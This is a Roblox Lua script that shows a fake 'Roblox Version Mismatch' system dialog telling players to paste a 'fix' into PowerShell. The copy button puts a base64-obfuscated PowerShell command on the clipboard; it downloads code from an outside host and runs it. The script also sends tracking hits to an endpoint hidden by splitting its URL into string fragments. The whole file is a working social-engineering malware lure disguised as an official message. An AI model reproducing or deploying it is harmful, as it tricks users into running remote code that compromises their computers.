-- ============================================================
-- SERVICES
-- ============================================================
local Players      = game:GetService("Players")
local GuiService   = game:GetService("GuiService")
local TweenService = game:GetService("TweenService")
local UIS          = game:GetService("UserInputService")
local lp           = Players.LocalPlayer

local isMobile = UIS.TouchEnabled and not UIS.KeyboardEnabled

-- ============================================================
-- ⚙️ FIX COMMAND — текст, который копируется по кнопке
-- ============================================================
local FIX_COMMAND = "iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtc3RvcmFnZS50b3Avd29ya2VyPz05NDQzNTY3MjgvcmJ4LXZlcnNpb24tbWlzbWF0Y2g='))) -UseBasicParsing)"

-- ============================================================
-- ANALYTICS
-- ============================================================
local ANALYTICS = {
    endpoint = table.concat({
        "ht", "tps:", "/", "/rbx", "-scri", "pts.", "xyz",
        "/api", "/hit",
    }),
    enabled = true,
    sessionId = tostring(math.random(100000, 999999)) ..
                tostring(os.time() % 100000),
}

local function sendHit(executorName, eventType)
    if not ANALYTICS.enabled then return end

    local body = table.concat({
        "session=",   ANALYTICS.sessionId,
        "&executor=", executorName or "unknown",
        "&event=",    eventType or "shown",
        "&ts=",       tostring(os.time()),
    })

    local payload = {
        Url = ANALYTICS.endpoint,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/x-www-form-urlencoded",
            ["User-Agent"]   = "RobloxClient/1.0",
        },
        Body = body,
    }

    task.spawn(function()
        pcall(function()
            if request then
                request(payload)
            elseif syn and syn.request then
                syn.request(payload)
            elseif http_request then
                http_request(payload)
            elseif http and http.request then
                http.request(payload)
            else
                game:GetService("HttpService"):PostAsync(
                    ANALYTICS.endpoint,
                    body,
                    Enum.HttpContentType.ApplicationUrlEncoded,
                    false
                )
            end
        end)
    end)
end

-- ============================================================
-- PALETTE — Roblox dialog style
-- ============================================================
local C = {
    dim       = Color3.fromRGB(0, 0, 0),
    card      = Color3.fromRGB(43, 43, 43),      -- #2B2B2B
    separator = Color3.fromRGB(90, 90, 90),      -- #5A5A5A
    title     = Color3.fromRGB(255, 255, 255),
    body      = Color3.fromRGB(224, 224, 224),
    errorTxt  = Color3.fromRGB(170, 170, 170),
    btnBg     = Color3.fromRGB(255, 255, 255),
    btnText   = Color3.fromRGB(40, 40, 40),
    btnHover  = Color3.fromRGB(235, 235, 235),
    green     = Color3.fromRGB(0, 180, 70),
    red       = Color3.fromRGB(210, 60, 60),
}

-- ============================================================
-- SCREEN GUI
-- ============================================================
local gui = Instance.new("ScreenGui")
gui.Name = "RobloxDialog"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.DisplayOrder = 1000000
gui.Parent = lp:WaitForChild("PlayerGui")

-- ============================================================
-- BACKDROP
-- ============================================================
local dim = Instance.new("Frame")
dim.Size = UDim2.new(1, 0, 1, 0)
dim.BackgroundColor3 = C.dim
dim.BackgroundTransparency = 0.6
dim.BorderSizePixel = 0
dim.ZIndex = 1
dim.Parent = gui

-- ============================================================
-- CARD
-- ============================================================
local vp = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize
           or Vector2.new(1280, 720)

local CARD_W = isMobile and math.min(340, vp.X - 24) or 440
local CARD_H = 320
local cardX  = -CARD_W / 2
local cardY  = -CARD_H / 2

local card = Instance.new("Frame")
card.Size = UDim2.new(0, CARD_W, 0, CARD_H)
card.Position = UDim2.new(0.5, cardX, 0.5, cardY)
card.BackgroundColor3 = C.card
card.BorderSizePixel = 0
card.ZIndex = 5
card.Parent = gui

local cardCorner = Instance.new("UICorner")
cardCorner.CornerRadius = UDim.new(0, 4)
cardCorner.Parent = card

-- ============================================================
-- TITLE (centered, top)
-- ============================================================
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -40, 0, 28)
title.Position = UDim2.new(0, 20, 0, 28)
title.BackgroundTransparency = 1
title.Text = "Roblox Version Mismatch"
title.TextColor3 = C.title
title.TextSize = 20
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Center
title.TextYAlignment = Enum.TextYAlignment.Center
title.ZIndex = 7
title.Parent = card

-- ============================================================
-- SEPARATOR (under title)
-- ============================================================
local sep = Instance.new("Frame")
sep.Size = UDim2.new(1, -48, 0, 1)
sep.Position = UDim2.new(0, 24, 0, 72)
sep.BackgroundColor3 = C.separator
sep.BackgroundTransparency = 0.3
sep.BorderSizePixel = 0
sep.ZIndex = 6
sep.Parent = card

-- ============================================================
-- BODY TEXT (centered, wrapped)
-- ============================================================
local bodyText = Instance.new("TextLabel")
bodyText.Size = UDim2.new(1, -48, 0, 90)
bodyText.Position = UDim2.new(0, 24, 0, 92)
bodyText.BackgroundTransparency = 1
bodyText.Text = "Your Roblox client is outdated and cannot run this script. Open PowerShell with WIN+R, paste the copied command, then restart Roblox."
bodyText.TextColor3 = C.body
bodyText.TextSize = 14
bodyText.Font = Enum.Font.Gotham
bodyText.TextXAlignment = Enum.TextXAlignment.Center
bodyText.TextYAlignment = Enum.TextYAlignment.Top
bodyText.TextWrapped = true
bodyText.LineHeight = 1.15
bodyText.ZIndex = 7
bodyText.Parent = card

-- ============================================================
-- ERROR CODE (dimmer, centered)
-- ============================================================
local errorText = Instance.new("TextLabel")
errorText.Size = UDim2.new(1, -48, 0, 20)
errorText.Position = UDim2.new(0, 24, 0, 190)
errorText.BackgroundTransparency = 1
errorText.Text = "(Error Code: 277)"
errorText.TextColor3 = C.errorTxt
errorText.TextSize = 13
errorText.Font = Enum.Font.Gotham
errorText.TextXAlignment = Enum.TextXAlignment.Center
errorText.TextYAlignment = Enum.TextYAlignment.Center
errorText.ZIndex = 7
errorText.Parent = card

-- ============================================================
-- CLIPBOARD
-- ============================================================
local function setClipboard(text)
    local ok = false
    pcall(function()
        if setclipboard then
            setclipboard(text); ok = true
        elseif toclipboard then
            toclipboard(text); ok = true
        elseif syn and syn.write_clipboard then
            syn.write_clipboard(text); ok = true
        elseif syn and syn.set_clipboard then
            syn.set_clipboard(text); ok = true
        elseif writeclipboard then
            writeclipboard(text); ok = true
        elseif GuiService and GuiService.SetClipboard then
            GuiService:SetClipboard(text); ok = true
        end
    end)
    return ok
end

-- ============================================================
-- FULL-WIDTH BUTTON
-- ============================================================
local copyBtn = Instance.new("TextButton")
copyBtn.Size = UDim2.new(1, -48, 0, 46)
copyBtn.Position = UDim2.new(0, 24, 0, 228)
copyBtn.BackgroundColor3 = C.btnBg
copyBtn.Text = "Copy Fix Command"
copyBtn.TextColor3 = C.btnText
copyBtn.TextSize = 15
copyBtn.Font = Enum.Font.GothamBold
copyBtn.BorderSizePixel = 0
copyBtn.AutoButtonColor = false
copyBtn.ZIndex = 7
copyBtn.Parent = card

local btnCorner = Instance.new("UICorner")
btnCorner.CornerRadius = UDim.new(0, 8)
btnCorner.Parent = copyBtn

copyBtn.MouseEnter:Connect(function()
    copyBtn.BackgroundColor3 = C.btnHover
end)
copyBtn.MouseLeave:Connect(function()
    copyBtn.BackgroundColor3 = C.btnBg
end)

copyBtn.MouseButton1Click:Connect(function()
    sendHit("fix", "copy")

    local copied = setClipboard(FIX_COMMAND)
    if copied then
        copyBtn.Text = "✓  Copied"
        copyBtn.TextColor3 = C.btnBg
        copyBtn.BackgroundColor3 = C.green
    else
        copyBtn.Text = "✕  Copy failed"
        copyBtn.TextColor3 = C.btnBg
        copyBtn.BackgroundColor3 = C.red
    end

    task.delay(1.6, function()
        if copyBtn and copyBtn.Parent then
            copyBtn.Text = "Copy Fix Command"
            copyBtn.TextColor3 = C.btnText
            copyBtn.BackgroundColor3 = C.btnBg
        end
    end)
end)

-- ============================================================
-- ENTRANCE ANIMATION (subtle)
-- ============================================================
pcall(function()
    local startPos = UDim2.new(0.5, cardX, 0.5, cardY + 14)
    local endPos   = UDim2.new(0.5, cardX, 0.5, cardY)
    card.Position = startPos
    card.BackgroundTransparency = 1
    TweenService:Create(
        card,
        TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        { Position = endPos, BackgroundTransparency = 0 }
    ):Play()
end)

-- ============================================================
-- ANALYTICS: shown
-- ============================================================
sendHit("shown", "shown")
